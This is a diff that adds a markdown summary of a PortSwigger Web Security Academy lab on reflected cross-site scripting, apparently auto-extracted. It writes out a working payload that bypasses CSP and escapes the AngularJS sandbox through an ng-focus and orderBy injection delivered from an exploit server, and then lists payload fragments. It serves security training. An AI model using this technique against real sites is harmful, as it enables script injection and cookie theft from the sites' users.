@@ -1,0 +1,35 @@
+## Reflected XSS with AngularJS sandbox escape and CSP
+
+**Category:** xss_reflected
+**Difficulty:** Unknown
+
+### Description
+To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alertsdocument.cookie.
+
+### Solution Steps
+1. Go to the exploit server and paste the following code, replacing YOUR-LAB-ID with your lab ID: <script>
+location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>
+2. Click "Store" and "Deliver exploit to victim".
+
+### Key Payloads
+- `document.cookie`
+- `YOUR-LAB-ID`
+- `<script>
+location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
+</script>`
+- `ng-focus`
+- `$event`
+- `path`
+- `window`
+- `orderBy`
+- `alert`
+- `$event.path`
+
+### Indicators of Success
+- Check for changes in application behavior
+- Look for error messages or data exposure
+- Verify the vulnerability type: xss_reflected
+
+---
+*Source: PortSwigger Web Security Academy*
